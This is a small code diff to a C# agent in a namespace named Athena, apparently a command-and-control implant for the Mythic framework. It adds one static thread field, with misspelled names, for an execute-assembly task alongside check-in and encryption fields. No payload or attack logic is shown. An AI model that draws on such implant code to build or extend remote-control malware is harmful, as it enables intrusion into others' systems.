@@ -22,6 +22,7 @@ namespace Athena
         public static int missedCheckins = 0;
         public static MythicClient mc;
         public static string executeAssemblyTask = "";
+        public static Thread executAseemblyTHread;
         public static System.Security.Cryptography.RSACryptoServiceProvider rsa;
     }
 }
